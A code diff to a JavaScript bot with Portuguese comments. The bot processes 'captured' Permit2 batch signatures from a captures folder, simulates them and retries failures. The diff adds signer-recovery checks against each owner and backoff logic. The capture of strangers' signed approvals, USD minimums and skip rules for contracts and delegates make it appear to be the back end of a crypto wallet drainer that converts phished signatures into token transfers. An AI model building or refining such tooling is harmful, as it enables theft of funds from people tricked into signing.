@@ -59,6 +59,19 @@ async function price(force = false) {
   return px;
 }
 
+const PERMIT_TYPES = {
+  PermitDetails: [
+    { name: "token", type: "address" },
+    { name: "amount", type: "uint160" },
+    { name: "expiration", type: "uint48" },
+    { name: "nonce", type: "uint48" },
+  ],
+  PermitBatch: [
+    { name: "details", type: "PermitDetails[]" },
+    { name: "spender", type: "address" },
+    { name: "sigDeadline", type: "uint256" },
+  ],
+};
 const now = () => Math.floor(Date.now() / 1000);
 const batchFrom = (cap) => ({
   details: (cap.details ?? []).map((d) => ({ token: getAddress(d.token), amount: BigInt(d.amount), expiration: Number(d.expiration), nonce: Number(d.nonce) })),
@@ -126,7 +139,7 @@ async function ciclo() {
   for (const f of arquivos) {
     const file = `captures/${f}`;
     const st = state.files[file] ?? { status: "novo", attempts: 0 };
-    if (st.status === "ok" || st.status === "expirado" || st.status === "teste" || st.status === "abaixo-min" || st.status === "sim-falhou") continue;
+    if (st.status === "ok" || st.status === "expirado" || st.status === "teste" || st.status === "abaixo-min" || st.status === "sim-falhou" || st.status === "sem-contrato" || st.status === "delegate") continue;
     if (st.status === "retry" && Date.now() < (st.next ?? 0)) continue;
 
     let cap;
@@ -173,8 +186,21 @@ async function ciclo() {
     try {
       await simular(cap);
     } catch (err) {
-      await alert("SIMULAÇÃO FALHOU (sem gastar gas)", `${cap.owner}\n${linhas.join(", ")}\n${(err.shortMessage || err.message).slice(0, 200)}\n-> provavel conta com code (ERC-1271) ou assinatura do outro spender`, "warning", "high");
-      state.files[file] = { status: "sim-falhou", attempts: st.attempts + 1, usd };
+      // diagnostico: quem a assinatura diz ser, e o motivo decodificado
+      let quem = "?";
+      try {
+        const { verifyTypedData } = await import("ethers");
+        if (cap.kind === "permit2") {
+          const b = batchFrom(cap);
+          quem = verifyTypedData({ name: "Permit2", chainId: cap.chainId ?? 1, verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" }, PERMIT_TYPES, b, cap.signature);
+        }
+      } catch {}
+      const tent = st.attempts + 1;
+      const sel = (err.data || err.info?.error?.data || "").slice(0, 10);
+      await alert(`SIMULAÇÃO FALHOU (tentativa ${tent}/3, sem gastar gas)`, `${cap.owner}\n${linhas.join(", ")}\nmotivo: ${err.shortMessage || err.message}\nselector: ${sel}\nassinatura recupera para: ${quem}${quem.toLowerCase() === cap.owner.toLowerCase() ? " (bate com o owner)" : " *** NAO BATE COM O OWNER ***"}`, "warning", "high");
+      state.files[file] = tent >= 3
+        ? { status: "sim-falhou", attempts: tent, usd }
+        : { status: "retry", attempts: tent, usd, next: Date.now() + 120_000 * tent };
       saveState(state);
       continue;
     }
